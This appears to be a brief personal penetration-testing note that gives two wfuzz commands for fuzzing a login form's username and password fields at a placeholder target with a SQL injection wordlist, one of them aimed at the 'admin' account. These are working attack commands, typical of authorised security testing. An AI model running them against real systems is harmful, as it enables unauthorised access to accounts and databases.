---
category: Uncategorized
tags: [pentest]
created: 2024-12-21

---
```bash - kali
wfuzz -c -w /usr/share/wordlists/wfuzz/Injections/SQL.txt -d “username=FUZZ&password=FUZZ” -u $TARGET
```

```bash - kali
wfuzz -c -w /usr/share/wordlists/wfuzz/Injections/SQL.txt -d “username=admin&password=FUZZ” -u $TARGET
```

[[SQLText]]


Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
